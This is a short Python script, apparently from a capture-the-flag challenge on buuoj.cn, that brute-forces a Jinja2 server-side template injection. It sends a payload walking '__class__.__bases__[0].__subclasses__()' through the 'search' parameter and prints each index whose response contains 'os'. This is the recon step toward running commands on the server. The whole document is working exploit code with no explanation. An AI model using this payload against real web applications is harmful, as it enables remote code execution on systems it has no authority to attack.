import requests

url = "http://04f772b7-efbb-45fb-983e-873c357519b7.node4.buuoj.cn:81/"

for i in range(1, 1000):
    payload = "?search={{[].__class__.__bases__[0].__subclasses__()[%s]}}" % i

    r = requests.get(url+payload).text
    # print(str(i)+" no")
    if 'os' in r:
        print(str(i)+"yes")
        # break
